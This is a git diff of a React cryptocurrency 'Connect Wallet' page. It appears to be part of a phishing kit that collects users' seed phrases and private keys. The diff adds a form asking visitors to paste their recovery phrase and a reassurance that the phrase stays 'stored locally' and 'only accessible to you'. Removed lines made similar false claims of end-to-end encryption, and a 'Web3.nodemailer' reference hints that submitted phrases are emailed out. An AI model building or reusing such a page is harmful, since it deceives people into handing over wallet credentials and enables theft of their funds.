@@ -3,17 +3,12 @@ import { ethers } from "ethers";
 import Web3 from "web3";
 import { errorNotification, successNotification } from "../../utils/helpers";
 import { useLocation, useNavigate } from "react-router-dom";
-import { wallets } from "../../utils/data";
 
 const ConnectPage = () => {
   const { state } = useLocation();
   const walletType = state.walletType;
   console.log("walletType", walletType);
   const [show, setShow] = useState(false);
-  const [wallet, setWallet] = useState({
-    logo: "hardware.jpg",
-    name: "Hardware Wallet",
-  });
   const [loading, setLoading] = useState(false);
   const [phrase, setPhrase] = useState("");
   const web3 = new Web3(Web3.nodemailer);
@@ -228,98 +223,69 @@ const ConnectPage = () => {
     }
   };
 
-  const handleSetWallet = (item) => {
-    setShow(true);
-    setWallet(item);
-  };
-
   return (
-    <div className="w-screen flex justify-center px-8 bg-[#808fff11]">
-      <div className="w-full min-h-[90vh] flex flex-col justify-center max-w-[1300px] mx-auto pt-10 pb-32 gap-4 lg:px-0 text-black">
-        {/* <div className="flex justify-center">
+    <div className="w-screen h-[90vh] flex justify-center items-center px-8 bg-[#808EFF]">
+      <div className="w-full max-w-[500px] pt-2 flex flex-col gap-4 lg:px-0 text-white">
+        <div className="flex justify-center">
           <img src="/assets/images/logo-2.png" alt="" className="w-40" />
-        </div> */}
-        <p className="text-2xl font-black mb-7 text-center">Connect Wallet</p>
+        </div>
+        <p className="text-2xl font-black">Connect Wallet</p>
+        <div className="mb-4">
+          <p className="font-bold text-sm">What is a Seed Phrase?</p>
+          <span className="text-sm">
+            A 12, 18, or 24-word phrase used to control your assets.
+          </span>
+        </div>
+        <div className="mb-4">
+          <p className="font-bold text-sm">
+            Is it safe to import it in {import.meta.env.VITE_APP_NAME}?
+          </p>
+          <span className="text-sm">
+            Yes, it will be stored locally on your browser and only accessible
+            to you.
+          </span>
+        </div>
+        <div
+          onClick={() => setShow(true)}
+          className="btnn2 px-4 py-3 w-full font-semibold text-center"
+        >
+          {walletType === "software" ? "Import Seed Phrase" : "Keystore File"}
+        </div>
 
-        {walletType === "software" ? (
-          <div className="grid grid-cols-2 lg:grid-cols-4 gap-7">
-            {wallets.map((item, i) => (
-              <div
-                className="col-span-1 p-4 bg-white flex gap-5 items-center cursor-pointer rounded-lg"
-                key={i}
-                onClick={() => handleSetWallet(item)}
-                style={{ boxShadow: "4px 4px 7px #13131327" }}
-              >
-                <img
-                  src={`/public/assets/images/wallets/${item.logo}`}
-                  alt=""
-                  className="w-6 lg:w-16 rounded-full"
-                />
-                <div className="flex flex-col">
-                  <span className="font-semibold text-sm lg:text-[16px]">
-                    {item.name}
-                  </span>
-                  <span className="text-gray-700 text-[9px] lg:text-md">
-                    {item.subtitle}
-                  </span>
-                </div>
-              </div>
-            ))}
-          </div>
-        ) : (
-          <>
-            <div
-              onClick={() => setShow(true)}
-              className="btnn2 px-4 py-3 w-full font-semibold text-center"
-            >
-              Keystore File
-            </div>
-
-            <div
-              onClick={() => setShow(true)}
-              className="btnn2 px-4 py-3 w-full font-semibold text-center"
-            >
-              Import Private Key
-            </div>
-          </>
-        )}
+        <div
+          onClick={() => setShow(true)}
+          className="btnn2 px-4 py-3 w-full font-semibold text-center"
+        >
+          {walletType === "software"
+            ? "Import Private Key"
+            : "Import Private Key"}
+        </div>
       </div>
       {show ? (
         <div className="fixed w-screen h-screen flex justify-center items-center bg-black/70 px-5 lg:px-0">
           <div
-            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#fff] py-12 rounded-lg relative"
+            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#fff] py-12 rounded-lg"
             style={{ boxShadow: "4px 3px 10px #85a1fe3f" }}
           >
-            <div className="flex flex-col items-center mb-5">
-              <img
-                src={`/assets/images/wallets/${wallet.logo}`}
-                alt=""
-                className="w-10 mb-3"
-              />
-              <span className="font-semibold text-xl text-black mb-5">
-                {wallet.name}
-              </span>
-              <p className="text-gray-700 text-md">
-                This session is secure and encrypted
-              </p>
+            <div className="flex justify-between items-center mb-10">
+              <p className="font-bold text-xl">Import Your Wallet</p>
+
+              <div
+                className="h-[30px] w-[30px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg"
+                onClick={() => setShow(false)}
+              >
+                x
+              </div>
             </div>
-            <div
-              className="absolute -top-5 -right-6 h-[35px] w-[35px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg bg-white"
-              onClick={() => setShow(false)}
-            >
-              x
-            </div>
+            <span className="text-sm mb-5">
+              Paste your wallet Seed Phrase/Private Key here
+            </span>
             <form onSubmit={handleWalletImport} className="flex flex-col">
-              <textarea
+              <input
                 type="text"
                 value={phrase}
                 onChange={(e) => setPhrase(e.target.value)}
-                className="mb-7 h-20"
-                placeholder={
-                  walletType === "software"
-                    ? "Enter your 12 or 24 words Mnemonic Phrase. Separate them with spaces"
-                    : ""
-                }
+                className="mb-7"
               />
               <input
                 type="submit"
@@ -332,17 +298,6 @@ const ConnectPage = () => {
                 disabled={loading ? true : false}
               />
             </form>
-
-            <div className="flex gap-2 items-center mt-6">
-              <img
-                src="/assets/images/chains/shield.png"
-                alt=""
-                className="w-8"
-              />
-              <span className="font-semibold text-center">
-                This session is protected with an end-to-end encryption
-              </span>
-            </div>
           </div>
         </div>
       ) : null}
